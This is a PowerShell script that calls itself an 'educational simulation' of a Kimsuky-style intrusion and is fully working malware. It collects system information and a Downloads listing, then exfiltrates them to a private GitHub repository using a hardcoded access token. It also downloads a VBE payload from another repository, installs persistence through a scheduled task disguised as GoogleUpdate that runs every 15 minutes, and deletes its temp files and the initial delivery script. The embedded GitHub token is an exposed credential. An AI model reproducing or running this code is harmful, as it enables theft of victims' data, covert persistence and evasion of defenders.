# help.ini - Educational Simulation
# Collects systeminfo + Downloads listing, Base64 encodes, uploads via
# GitHub Contents API to a private repo, sets persistence via scheduled task,
# then cleans up traces.

# ---- Step 0: pin TLS 1.2 so api.github.com calls succeed on older builds ----
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }

# ---- Step 1: Collect systeminfo ----
$systemInfo = systeminfo | Out-String

# ---- Step 2: Collect Downloads listing (up to two levels deep) ----
$downloadsListing = Get-ChildItem -Path "$env:USERPROFILE\Downloads" -Recurse -Depth 2 -ErrorAction SilentlyContinue |
    Select-Object FullName, Length, LastWriteTime |
    Format-Table -AutoSize | Out-String -Width 512

# ---- Step 3: Save to temp files ----
$timestamp = Get-Date -Format "yyyy-MM-dd_HHmm"
$sysFile  = "$env:TEMP\SYS_$timestamp.tmp"
$downFile = "$env:TEMP\DOWN_$timestamp.tmp"

$systemInfo       | Out-File -FilePath $sysFile  -Encoding UTF8
$downloadsListing | Out-File -FilePath $downFile -Encoding UTF8

Write-Host "[Educational Demo] Collected: $sysFile, $downFile"

# ---- Step 4: Base64 encode ----
$sysBase64  = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($systemInfo))
$downBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($downloadsListing))

# ---- Step 5: Upload via GitHub Contents API ----
# Replace placeholders before running
$githubOwner  = "ccxxrr12"
$githubRepo   = "chseirfkks"
$githubToken  = "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"
$computerName = $env:COMPUTERNAME

function Upload-File($remotePath, $b64Content, $commitMsg) {
    $body = @{ message = $commitMsg; content = $b64Content } | ConvertTo-Json
    $uri = "https://api.github.com/repos/$githubOwner/$githubRepo/contents/$remotePath"
    try {
        Invoke-RestMethod -Method PUT -Uri $uri -Headers @{
            "Authorization" = "Bearer $githubToken"
            "Accept"        = "application/vnd.github.v3+json"
            "User-Agent"    = "kimsuky-demo"
        } -Body $body -ContentType "application/json" | Out-Null
        Write-Host "[Educational Demo] Uploaded: $remotePath"
    } catch {
        Write-Host "[Educational Demo] Upload failed ($remotePath): $_"
    }
}

Upload-File "$computerName/SYS_$timestamp.tmp"  $sysBase64  "SYS_$timestamp"
Upload-File "$computerName/DOWN_$timestamp.tmp" $downBase64 "DOWN_$timestamp"

# ---- Step 6: Download shibaa.vbe (persistence wrapper) and register scheduled task ----
$shibaaUrl  = "https://api.github.com/repos/ccxxrr12/bahubali/contents/shibaa.vbe"
$shibaaPath = "C:\Users\Public\Music\shibaa.vbe"
if (-not (Test-Path "C:\Users\Public\Music")) {
    New-Item -ItemType Directory -Path "C:\Users\Public\Music" -Force | Out-Null
}
curl.exe -k -L -H "User-Agent: kimsuky-demo" -H "Accept: application/vnd.github.v3.raw" $shibaaUrl -o $shibaaPath

$taskName = "GoogleUpdateTaskMachineUA{1C791230-CA8D-6D04-AC55-E498ABE7C33}"
$action   = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$shibaaPath`""
# Repeat every 15 minutes, indefinitely. Do NOT pass -RepetitionDuration here:
# on Windows 10 1809+ / Windows 11 the MaxValue form serialises to
# P99999999DT23H59M59S and Register-ScheduledTask fails with 0x80041318
# ("task XML contains a value which is incorrectly formatted or out of range").
# Omitting the duration is the documented way to repeat forever.
$trigger  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) `
                -RepetitionInterval (New-TimeSpan -Minutes 15)
try { $trigger.Repetition.StopAtDurationEnd = $false } catch { }
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    Write-Host "[Educational Demo] Scheduled task registered: $taskName"
} catch {
    Write-Host "[Educational Demo] Task registration failed: $_"
}

# ---- Step 7: Cleanup (delete temp files and initial delivery script) ----
Remove-Item -Path $sysFile -Force -ErrorAction SilentlyContinue
Remove-Item -Path $downFile -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Users\Public\Music\apple.vbe" -Force -ErrorAction SilentlyContinue

Write-Host "[Educational Demo] help.ini execution complete. Traces cleaned."
